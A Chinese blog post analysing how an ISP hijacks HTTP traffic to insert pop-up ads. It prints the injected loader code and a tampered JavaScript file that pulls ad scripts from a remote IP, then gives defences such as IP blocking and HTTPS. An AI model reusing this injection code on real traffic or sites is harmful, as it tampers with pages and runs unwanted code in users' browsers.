---
layout: post
title:  "中国电信劫持HTTP流量强插广告"
date:   2015-04-15 22:50:35
categories: Web
---

## 现象

家里装的宽带是浙江电信的，在平时用浏览器访问网页时，网页右下角经常弹出浮动广告。常见的广告是这个样子的，很违和吧？

![弹出广告截图](/images/20150415/01.png)

该广告有几个特点：

* 不管是中国还是外国网站，都有可能弹广告。
* 有些知名网站似乎没有弹过广告，比如新浪微博、Stack Overflow。
* 对某一个网站，只在每天第一次访问时弹广告，显示过一次之后，再刷新网页就不会出现了。第二天访问时还可能弹广告。
* 所有的HTTPS站都没有广告。

## 原理分析

### 广告是谁加的

一开始看过几次广告之后，以为是被访问网站自己加的广告联盟之类的代码，第一反应当然是用浏览器的去广告插件屏蔽。通过Chrome查看DOM，发现广告的嵌入代码如下，

```HTML
<script src="http://116.252.178.232:9991/ad.0.js?v=3.9411&amp;sp=9999&amp;ty=dpc&amp;sda_man=XFpdU1RJWFdZXlE=" type="text/javascript" id="bdstat"></script>
```

一般是出现在`</body>`之前，即HTML body的最后。服务器地址116.252.178.232属于广西电信。

当在几个国外网站上弹出了同样的中文广告后，我确定这不是网站自己加的广告代码。Google一下这个IP地址，普遍反映这是ISP劫持HTTP流量，插入的广告。

这种行为更准确的名称叫“[网络直投广告](http://baike.baidu.com/view/6261865.htm)”，百度百科是这样介绍的。

> 网络直投广告是基于中国电信宽带接入网，通过对用户上网行为的分析，在用户上网时、或正在上网的过程中，系统主动、定向、策略性、个性化的向用户推送广告宣传信息。并可以根据用户当前浏览的网站类型，匹配对应的行业关键字，根据行业关键字向用户推送动画、声音、视频、游戏等多媒体交互式广告内容。关键字分类：电脑、通讯、汽车、财经、医药、房产、旅游、教育、人才、美容、电影、游戏、数码等。

所以，这段代码是ISP强行插入的网络直投广告。由于用户访问所有网络都要经过ISP，ISP就有机会给任意网站加广告，把整个网络作为工具为自己牟利。搜索发现不光是电信，联通也有类似行径。某年315还曝光过，之后各地ISP有所收敛，但现在我家浙江电信还是每天都会弹。

### 如何加的广告

用浏览器访问刚才的广告嵌入代码，`http://116.252.178.237:9991/ad.0.js`内容经过格式化后如下，

```Javascript
var bcdata_sp = "";
var sda_man = "";
var bcdata_src = "0";
(function () {
    var a = function (h, f) {
        try {
            var d = document.createElement("span");
            d.innerHTML = h;
            api.writeO(d, f)
        } catch (g) {
            document.write(h)
        }
    };
    var c = function (d, f) {
        if (f) {
            f.appendChild(d);
            f.parentNode.appendChild(d)
        } else {
            var g = f || document.all || document.getElementsByTagName("*");
            var f = g[g.length - 1]
        }
        f.parentNode.appendChild(d)
    };
    var b = document.createElement("script");
    b.type = "text/javascript";
    b.src = "http://116.252.178.237:9991/main.js?ver=v48";
    c(b)
})();
```

这段引导代码在DOM上添加另一个script节点，内容为`http://116.252.178.237:9991/main.js`。`main.js`是弹出广告真正的创建者。

那么`ad.0.js`是何时插入的呢？在不同的网站上，`ad.0.js`节点出现的位置不固定，不一定总在`</body>`之前。继续用Chrome的Network工具查看每个请求的返回数据，发现网页HTML是正常的，并不包含`ad.0.js`节点。推测是某个JS被篡改了，执行的时候在DOM上又插入了广告引导代码节点。

逐个检查`.js`文件的请求，寻找包含“116.252.178.232”的文件。以某网站为例，发现`flowplayer.min.js`文件的内容不正常。该文件是网页上的视频播放器，托管在七牛CDN上。文件的URL是`http://***.qiniudn.com/static/player/flowplayer.min.js`，Chrome里显示返回的内容是这样的，

```Javascript
(function () {
    o = "http://***.qiniudn.com/static/player/flowplayer.min.js?";
    sh = "http://116.252.178.232:9991/ad.0.js?v=3.9411&sp=9999&ty=dpc&sda_man=XFpdU1RJWFdZXlE=";
    w = window;
    d = document;

    function ins(s, dm, id) {
        e = d.createElement("script");
        e.src = s;
        e.type = "text/javascript";
        id ? e.id = id : null;
        dm.appendChild(e);
    };
    p = d.scripts[d.scripts.length - 1].parentNode;
    ins(o, p);
    ds = function () {
        db = d.body;
        if (db && !document.getElementById("bdstat")) {
            if ((w.innerWidth || d.documentElement.clientWidth || db.clientWidth) > 1) {
                if (w.top == w.self) {
                    ins(sh, db, "bdstat");
                }
            }
        } else {
            setTimeout("ds()", 1500);
        }
    };
    ds();
})();
```

可以看到该文件的返回数据完全是被替换过的。这段代码首先在DOM上插入了另外一个`<script>`节点，用于重新加载真正的`flowplayer.min.js`文件。然后创建了广告引导代码节点。在Chrome中，看到`flowplayer.min.js`文件有两次请求，第二次返回的是正确的内容。

新插入的`<script>`位置在document最后一个script的父节点，由于改变了JS文件的执行顺序，所以理论上有可能影响被篡改的网页的正常功能。

关于这套广告系统具体如何选择篡改哪个JS请求，我没有进一步的调查。

### 其他劫持类型

我这里分析的只是浙江电信在目前阶段采用的插广告方法。网上能看到ISP采用的一些旧方法，包括DNS劫持、iframe劫持。

DNS劫持是，例如用户访问Google时，跳转到一个全是广告的页面。还有当访问一个无法解析的网址时，跳转到电信的网址导航站189so.cn，导航站当然是很赚钱的。

iframe劫持也是劫持HTTP流量，将被访问的网页整个包在一个iframe中加载，外面的伪造的页面插弹出广告。用户看到的效果跟本文开头的截图类似。

## 屏蔽方法

### 用户

作为普通用户，一般的建议是打电话给ISP投诉，把客服骂一顿，让ISP取消对你家账号的“特殊服务”。我没试过，也不想试，我得留着广告好看看ISP又采取了什么卑劣手段。

作为普通用户，还可以找个认识的程序员来帮助解决此事。

作为程序员，屏蔽这种广告不是难事。首先用浏览器开发者工具在找出广告引导代码的URL，如果是IP地址，就用路由器或防火墙软件封住该IP的访问；如果是域名，就修改hosts把该域名解析到127.0.0.1即可。

注意这样仅靠屏蔽IP/域名并不是真正的屏蔽，仍然有副作用。比如说网页会由于加载不到广告JS而一直处于转菊花状态，经过篡改的网页有可能功能不正常。前人给出了一些复杂的方法屏蔽广告，基本上都要自己搭代理服务器。我觉得太过复杂，不值得。在此列出几个参考方法：

* [Tomato解决电信广告劫持](http://maskv.com/technology/289.html)
* [如何对抗 ISP HTTP hijacking (阻止推送广告)](http://www.linuxsir.org/bbs/thread367305.html)
* [防治运营商HTTP劫持的终极技术手段](http://www.williamlong.info/archives/4181.html)

### 网站所有者

作为网站所有者，有没有办法彻底去除ISP强插到你网站上的广告呢？这样不管你的用户有没有屏蔽广告的能力，在访问网站时都不会看到恼人的广告。

第一个可行的办法是HTTPS化，HTTPS请求无法简单的伪造。目前由于网络安全的形势不好，很多网站都做了全站HTTPS化。虽然有一些开销，这毕竟是个最有效的办法。

目前ISP的做法是只劫持JS文件，那一个简便的方法是JS全部放到七牛CDN上，利用[七牛提供的HTTPS服务](http://kb.qiniu.com/https-support)，只把网页上的JS地址换成HTTPS的，ISP就无法伪造了。（经过在某网站上的试验，该方法目前有效。）

另一个可能的方法是在页面上增加JS代码，检测ISP插入的节点并删掉。这种方法的困难在于ISP插广告是分地区的，而且将来会升级的。作为网站所有者，只能针对已知的情况做针对处理，不一定总能有效。
